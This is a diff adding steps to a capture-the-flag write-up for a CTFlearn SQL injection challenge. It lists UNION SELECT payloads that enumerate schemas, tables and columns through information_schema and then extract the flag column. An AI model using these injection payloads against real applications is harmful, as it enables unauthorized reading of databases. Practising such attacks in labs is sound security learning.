@@ -20,3 +20,17 @@ https://ctflearn.com/challenge/149
 ```
 1 UNION SELECT null,null,schema_name,null FROM information_schema.schemata --
 ```
+* the next step is to determine the table names
+* this payload lets us know that the table name is `w0w_y0u_f0und_m3`
+```
+1 union SELECT null,null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema = database() --
+```
+* the next step is to find out the column names in the table
+* this payload lets us know that these are the names of the columns:
+```
+-1 union select null,null,column_name,null FROM information_schema.columns -- -
+```
+* the last step is to get everything from that column with the following payload
+```
+-1 union select null,null,f0und_m3,null FROM w0w_y0u_f0und_m3 -- -
+```
